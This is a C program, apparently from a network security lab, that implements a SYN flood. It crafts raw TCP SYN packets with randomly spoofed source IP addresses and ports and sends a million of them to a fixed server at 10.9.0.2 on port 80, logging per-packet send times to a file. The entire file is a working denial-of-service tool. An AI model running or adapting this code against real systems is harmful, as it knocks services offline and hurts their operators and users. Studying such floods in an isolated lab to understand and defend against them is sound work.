#define _GNU_SOURCE // for clock_gettime
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define MASK 256            // Used for generating random IP addresses
#define PACKET_SIZE 1 << 12 // Maximum packet size - 4096 bytes
#define SERVER_IP "10.9.0.2"
#define SERVER_PORT 80
#define NUM_OF_TRIES 10000
#define NUM_OF_ITERATIONS 100

/**
 * Define a pseudo header structure for TCP checksum calculation
 */
struct pseudo_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

/**
 * Generic checksum calculation function
 */
unsigned short checksum(void *b, int len)
{
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

/**
 * Function to get current time in milliseconds
 */
double current_timestamp_ms()
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1000000.0;
}

void handle_packet(char *packet,struct iphdr *iph, struct tcphdr *tcph, struct pseudo_header *psh)
{

    // Create IP Header
    iph->ihl = 5;                                                // Internet Header Length
    iph->version = 4;                                            // IPv4
    iph->tos = 0;                                                // Type of Service
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr); // Total length of the packet
    iph->id = htonl(54321);                                      // Id of this packet
    iph->frag_off = 0;                                           // Fragmentation offset
    iph->ttl = 255;                                              // Time to live
    iph->protocol = IPPROTO_TCP;                                 // Protocol
    iph->check = 0;                                              // Set to 0 before calculating checksum
    iph->daddr = inet_addr(SERVER_IP);                           // Destination IP

    // Create TCP Header
    tcph->dest = htons(SERVER_PORT);   // Destination port
    tcph->seq = 0;                     // Sequence number of the packet (doesn't matter in our case)
    tcph->ack_seq = 0;                 // Acknowledgement number of the packet (doesn't matter in our case)
    tcph->doff = 5;                    // tcp header size
    tcph->fin = 0;
    tcph->syn = 1;                     // SYN flag is set to TRUE
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0; 
    tcph->urg = 0;
    tcph->window = htons(5840);         // maximum allowed window size
    tcph->check = 0;                    // Checksum will be filled later by pseudo header
    tcph->urg_ptr = 0;

    // Assign values to pseudo header
    psh->dest_address = inet_addr(SERVER_IP);
    psh->placeholder = 0;
    psh->protocol = IPPROTO_TCP;
    psh->tcp_length = htons(sizeof(struct tcphdr));  // IP Header include TCP Header size
}

int main()
{
    int sock;
    FILE *log_file; // Log file to store results
    double start_time, end_time, packet_start, packet_end;
    double time_taken;       // Time taken to send a single packet
    long total_packets = 0;  // Total packets sent
    double total_time = 0.0; // Total time taken to send all packets

    // Open log file
    log_file = fopen("syn_flood_log.txt", "w");
    if (log_file == NULL)
    {
        printf("Error opening file!\n");
        exit(EXIT_FAILURE);
    }

    // Record start time
    time_t t = time(NULL);

    fprintf(log_file, "start time: %s", ctime(&t)); // Log the start time to the log file
    start_time = current_timestamp_ms();

    // Create an IPv4 raw socket over TCP
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0)
    {
        perror("Socket creation failed");
        fclose(log_file);
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    // Set IP_HDRINCL to tell the kernel that headers are included in the packet
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0)
    {
        perror("Setsockopt failed");
        close(sock);
        fclose(log_file);
        return 1;
    }

    // Create buffer for the packet
    char packet[PACKET_SIZE];
    memset(packet, 0, PACKET_SIZE);

    // Set pointers to the IP header and TCP header in the packet
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr)); // TCP Header comes after the IP header
    struct pseudo_header psh;
    handle_packet(packet,iph,tcph, &psh); // Handle the packet (Assign values to IP and TCP headers)

    printf("Sending SYN flood to %s:%d\n", SERVER_IP, SERVER_PORT);

    for (size_t j = 0; j < NUM_OF_ITERATIONS; j++)
    {
        for (size_t i = 0; i < NUM_OF_TRIES; i++)
        {
            // Defenitions that change for each iteration:
            int mask1, mask2, mask3, mask4; // Will be used to create a random IP address

            // Generate random source IP address
            mask1 = rand() % MASK;
            mask2 = rand() % MASK;
            mask3 = rand() % MASK;
            mask4 = rand() % MASK;
            char src_ip[16];
            snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", mask1, mask2, mask3, mask4); // Random source IP

            int source_port = (rand() % (65535 - 1024)) + 1024; // Random source port

            // Assign values to the IP header
            iph->saddr = inet_addr(src_ip);                                // Source IP
            iph->check = checksum((unsigned short *)packet, iph->tot_len); // Calculate checksum for the IP header

            // Assign values to the TCP header
            tcph->source = htons(source_port);                             // Source port

            // Assign values to the pseudo header
            psh.source_address = inet_addr(src_ip);                        // Source IP for pseudo header

            // Create a pseudo packet to calculate checksum
            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);   // Size of pseudo header
            char *pseudo_packet = (char *)malloc(psize);    // pseudo packet mimics the original packet, to calculate checksum
            memcpy(pseudo_packet, (char *)&psh, sizeof(struct pseudo_header));                  // Copy pseudo header to the packet
            memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));  // Copy TCP header to the packet

            tcph->check = checksum((unsigned short *)pseudo_packet, psize); // Calculate checksum and assign to TCP header
            
            free(pseudo_packet);
            
            // Define the destination address
            struct sockaddr_in dest;                     
            dest.sin_family = AF_INET;                      
            dest.sin_port = htons(SERVER_PORT);
            dest.sin_addr.s_addr = inet_addr(SERVER_IP);

            packet_start = current_timestamp_ms(); // Record start time of packet sending
            if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
            {
                perror("Send failed");
                // Would not crash if not sent
            }
            packet_end = current_timestamp_ms(); // Record end time of packet sending

            time_taken = packet_end - packet_start;

            total_packets++;
            total_time += time_taken;

            fprintf(log_file, "%ld %.3f ms\n", total_packets, time_taken);
        }
    }

    // Record end total time
    end_time = current_timestamp_ms();

    double avg_time = total_time / total_packets;
    fprintf(log_file, "Total packets sent: %ld\n", total_packets);
    fprintf(log_file, "Total time taken: %.3f ms\n", total_time);
    fprintf(log_file, "Average time per packet: %.3f ms\n", avg_time);

    t = time(NULL);
    fprintf(log_file, "End time: %s", ctime(&t));

    close(sock);
    fclose(log_file);
    printf("\nConnection closed. Results logged to syn_flood_log.txt\n");
    return EXIT_SUCCESS;
}